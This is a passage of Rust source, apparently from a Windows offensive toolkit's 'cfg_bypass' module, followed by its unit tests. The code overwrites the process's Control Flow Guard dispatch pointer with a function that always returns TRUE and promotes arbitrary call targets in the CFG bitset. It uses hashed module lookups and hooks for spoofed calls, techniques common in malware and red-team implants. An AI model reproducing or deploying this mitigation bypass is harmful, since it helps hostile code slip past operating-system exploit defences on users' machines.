///
/// This function is called by the CFG dispatch mechanism for EVERY indirect
/// call in the process.  It must:
/// - Never panic
/// - Never access thread-local storage
/// - Return immediately with TRUE
/// - Have the correct signature: `fn(usize) -> BOOL`
#[no_mangle]
pub unsafe extern "system" fn cfg_always_valid(_target: usize) -> BOOL {
    1 // TRUE — always allow the indirect call
}

/// Install the CFG dispatch override (Strategy 3).
///
/// Replaces `guard_check_icall_fptr` with a custom function that always
/// returns TRUE.  The custom function's address is first promoted via
/// Strategy 1 so that the CFG dispatch itself passes the CFG check.
///
/// The original function pointer is saved for restoration via
/// `remove_dispatch_override`.
pub fn install_dispatch_override() -> Result<()> {
    if OVERRIDE_ACTIVE.load(Ordering::SeqCst) {
        return Err(CfgError::OverrideActive);
    }

    // First, promote our custom function's address.
    let custom_addr = cfg_always_valid as *const () as usize;
    promote_address(custom_addr & !0xF)?; // Align down to 16 bytes

    // Find the guard_check_icall_fptr in the process.
    // This is stored in the PE load config directory of the executable.
    let guard_fptr = find_guard_check_icall_fptr()?;

    // Save the original.
    let original = unsafe { (guard_fptr as *const usize).read_volatile() };
    let _ = ORIGINAL_GUARD_FPTR.set(original);
    let _ = CUSTOM_GUARD_FPTR.set(custom_addr);

    // Replace with our custom function.
    unsafe {
        (guard_fptr as *mut usize).write_volatile(custom_addr);
    }

    OVERRIDE_ACTIVE.store(true, Ordering::SeqCst);

    log::info!(
        "cfg_bypass: dispatch override installed (original={:#x}, custom={:#x})",
        original,
        custom_addr,
    );

    Ok(())
}

/// Remove the CFG dispatch override, restoring the original function pointer.
pub fn remove_dispatch_override() -> Result<()> {
    if !OVERRIDE_ACTIVE.load(Ordering::SeqCst) {
        return Err(CfgError::OverrideNotActive);
    }

    let original = ORIGINAL_GUARD_FPTR.get().copied().ok_or(CfgError::OverrideNotActive)?;
    let guard_fptr = find_guard_check_icall_fptr()?;

    // Restore the original function pointer.
    unsafe {
        (guard_fptr as *mut usize).write_volatile(original);
    }

    OVERRIDE_ACTIVE.store(false, Ordering::SeqCst);

    log::info!(
        "cfg_bypass: dispatch override removed (restored original={:#x})",
        original,
    );

    Ok(())
}

/// Find the `guard_check_icall_fptr` address in the executable's PE load config.
///
/// The `guard_check_icall_fptr` is stored at the `GuardCFDispatchFunctionPointer`
/// field (offset 0x70) in the `IMAGE_LOAD_CONFIG_DIRECTORY64` of the executable.
fn find_guard_check_icall_fptr() -> Result<usize> {
    // Get the executable's base address.
    let exe_base = unsafe {
        pe_resolve::get_module_handle_by_hash(0) // 0 = first PEB module (exe)
    }
    .ok_or(CfgError::ResolutionFailed)?;

    unsafe {
        let base = exe_base as *const u8;

        let e_lfanew = (base.add(0x3C) as *const u32).read_unaligned() as usize;
        let pe_sig = (base.add(e_lfanew) as *const u32).read_unaligned();
        if pe_sig != 0x0000_4550 {
            return Err(CfgError::ResolutionFailed);
        }

        // Optional header starts at e_lfanew + 24.
        let opt_hdr_off = e_lfanew + 24;
        let opt_magic = (base.add(opt_hdr_off) as *const u16).read_unaligned();
        if opt_magic != 0x20B {
            return Err(CfgError::ResolutionFailed);
        }

        // Load Config directory: DataDirectory[10].
        let load_config_dir_off = opt_hdr_off + 112 + 10 * 8;
        let load_config_rva = (base.add(load_config_dir_off) as *const u32).read_unaligned();

        if load_config_rva == 0 {
            return Err(CfgError::ResolutionFailed);
        }

        let lc_base = base.add(load_config_rva as usize);

        // GuardCFDispatchFunctionPointer at offset 0x70 in
        // IMAGE_LOAD_CONFIG_DIRECTORY64.
        // This is a POINTER to the actual guard_check_icall_fptr.
        // The pointer points to the data directory entry that the OS fills in.
        let dispatch_fptr_ptr = lc_base.add(0x70) as *const usize;
        let dispatch_fptr = dispatch_fptr_ptr.read_unaligned();

        if dispatch_fptr == 0 {
            return Err(CfgError::ResolutionFailed);
        }

        Ok(dispatch_fptr)
    }
}

// ─── Integration API: prepare_call / cleanup_call ──────────────────────────

/// Prepare for an indirect call by ensuring the target address is CFG-valid.
///
/// Called before `spoof_call` / `clean_call!` to promote the target address
/// in the CFG bitset.  If CFG is not enabled or the bypass is not active,
/// this is a no-op.
///
/// Returns `Ok(())` if the call can proceed (CFG bypass succeeded or not
/// needed), or an error if the bypass failed and the call should be aborted.
#[inline]
pub fn prepare_call(target_addr: usize) -> Result<()> {
    if !is_enabled() {
        return Ok(());
    }

    // Align down to 16-byte CFG granularity.
    let aligned_addr = target_addr & !0xF;

    // Strategy 1: promote in bitset.
    match promote_address(aligned_addr) {
        Ok(()) => {
            log::trace!("cfg_bypass: promoted {:#x} for indirect call", aligned_addr);
            Ok(())
        }
        Err(CfgError::BitsetNotFound) => {
            // Bitset not available — try trampoline (Strategy 2).
            if get_trampoline(None).is_some() {
                log::trace!(
                    "cfg_bypass: using trampoline fallback for {:#x}",
                    target_addr,
                );
                Ok(())
            } else {
                log::warn!(
                    "cfg_bypass: no bitset or trampoline for {:#x}, proceeding without CFG bypass",
                    target_addr,
                );
                Ok(()) // Don't abort — the call might still work
            }
        }
        Err(e) => {
            log::warn!("cfg_bypass: prepare_call failed for {:#x}: {}", target_addr, e);
            Err(e)
        }
    }
}

/// Clean up after an indirect call.
///
/// Optionally demotes the target address from the CFG bitset if `auto_demote`
/// was enabled in the config.  By default, addresses remain promoted for
/// performance (subsequent calls to the same address don't need re-promotion).
#[inline]
pub fn cleanup_call(target_addr: usize) {
    if !is_enabled() {
        return;
    }

    // Auto-demote is disabled by default for performance.
    // If needed, callers can explicitly call demote_address.
    let _ = target_addr;
}

// ─── Tests ────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_const_hash_str_consistency() {
        // Verify that const_hash_str matches pe_resolve::hash_str at runtime.
        let test_str = b"NtProtectVirtualMemory\0";
        let const_hash = const_hash_str(test_str);
        let runtime_hash = pe_resolve::hash_str(test_str);
        assert_eq!(const_hash, runtime_hash);
    }

    #[test]
    fn test_const_hash_wstr_consistency() {
        let test_wstr: &[u16] = &[
            b'n' as u16, b't' as u16, b'd' as u16, b'l' as u16, b'l' as u16,
            b'.' as u16, b'd' as u16, b'l' as u16, b'l' as u16,
        ];
        let const_hash = const_hash_wstr(test_wstr);
        let runtime_hash = pe_resolve::hash_wstr(test_wstr);
        assert_eq!(const_hash, runtime_hash);
    }

    #[test]
    fn test_dll_hash_consistency() {
        // Verify our pre-computed hashes match what pe_resolve would produce.
        let ntdll_wstr: &[u16] = &[
            b'n' as u16, b't' as u16, b'd' as u16, b'l' as u16, b'l' as u16,
            b'.' as u16, b'd' as u16, b'l' as u16, b'l' as u16,
        ];
        let runtime = pe_resolve::hash_wstr(ntdll_wstr);
        assert_eq!(NTDLL_DLL_HASH, runtime);

        let k32_wstr: &[u16] = &[
            b'k' as u16, b'e' as u16, b'r' as u16, b'n' as u16, b'e' as u16,
            b'l' as u16, b'3' as u16, b'2' as u16, b'.' as u16, b'd' as u16,
            b'l' as u16, b'l' as u16,
        ];
        let runtime_k32 = pe_resolve::hash_wstr(k32_wstr);
        assert_eq!(KERNEL32_DLL_HASH, runtime_k32);
    }

    #[test]
    fn test_cfg_always_valid_returns_true() {
        let result = unsafe { cfg_always_valid(0xDEAD_BEEF) };
        assert_eq!(result, 1);
    }

    #[test]
    fn test_bit_index_alignment_check() {
        let info = CfgBitsetInfo {
            base: 0x7FF0_0000_0000,
            size: 0x1000,
        };

        // Aligned address should work.
        let aligned = 0x7FF0_0000_0010; // base + 16
        assert!(bit_index_for_addr(&info, aligned).is_ok());

        // The bit index should be 1 (one 16-byte step from base).
        let idx = bit_index_for_addr(&info, aligned).unwrap();
        assert_eq!(idx, 1);
    }

    #[test]
    fn test_bit_index_not_aligned() {
        let info = CfgBitsetInfo {
            base: 0x7FF0_0000_0000,
            size: 0x1000,
        };

        // promote_address/demote_address should reject non-aligned addresses.
        // bit_index_for_addr doesn't check alignment itself, but the
        // public functions do.
        let non_aligned = 0x7FF0_0000_0001;
        assert!(matches!(
            promote_address(non_aligned),
            Err(CfgError::NotAligned)
        ));
    }

    #[test]
    fn test_cfg_trampoline_fields() {
        let t = CfgTrampoline {
            address: 0x7FF0_1234_5678,
            dll_name: "ntdll.dll",
            instruction_offset: 0x1234_5678,
        };
        assert_eq!(t.address, 0x7FF0_1234_5678);
        assert_eq!(t.dll_name, "ntdll.dll");
        assert_eq!(t.instruction_offset, 0x1234_5678);
    }

    #[test]
    fn test_cfg_error_display() {
        assert_eq!(
            CfgError::CfgNotEnabled.to_string(),
            "CFG is not enabled"
        );
        assert_eq!(
            CfgError::NotAligned.to_string(),
            "address not aligned to 16-byte CFG granularity"
        );
        assert_eq!(
            CfgError::ProtectionChangeFailed(0xC000_0005u32 as i32).to_string(),
            "NtProtectVirtualMemory failed: NTSTATUS 0xC0000005"
        );
    }

    #[test]
    fn test_status_json_format() {
        let json = status_json();
        // Should be valid JSON-like string with expected fields.
        assert!(json.contains("cfg_state"));
        assert!(json.contains("initialized"));
        assert!(json.contains("bypass_enabled"));
        assert!(json.contains("bitset_resolved"));
        assert!(json.contains("trampolines"));
        assert!(json.contains("override_active"));
    }

    #[test]
    fn test_cfg_bypass_config_default() {
        let config = CfgBypassConfig::default();
        assert!(config.enabled);
        assert!(config.auto_promote);
        assert!(!config.auto_demote);
        assert!(!config.dispatch_override);
    }
}
